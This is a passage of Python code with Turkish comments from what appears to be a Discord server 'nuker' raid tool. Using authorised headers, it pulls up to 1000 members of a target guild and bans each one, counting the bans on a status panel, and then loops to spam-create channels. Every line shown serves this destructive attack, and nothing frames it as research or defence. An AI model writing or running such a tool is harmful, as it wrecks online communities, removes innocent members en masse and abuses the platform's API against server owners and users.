                    time.sleep(r_s)

    # 3. Üyeler
    m_res = requests.get(f'https://discord.com/api/v9/guilds/{TARGET_GUILD_ID}/members?limit=1000', headers=HEADERS)
    if m_res.status_code == 200:
        for m in m_res.json():
            if requests.put(f'https://discord.com/api/v9/guilds/{TARGET_GUILD_ID}/bans/{m["user"]["id"]}', headers=HEADERS).status_code in [200, 204]:
                stats["banlanan_uye"] += 1
                draw_panel()
                time.sleep(u_s)

    # 4. Kanal Açma
    for _ in range(k_a):
        requests.post(f'https://discord.com/api/v9/guilds/{TARGET_GUILD_ID}/channels', 
                      headers=HEADERS, json={"name": k_i, "type": 0})

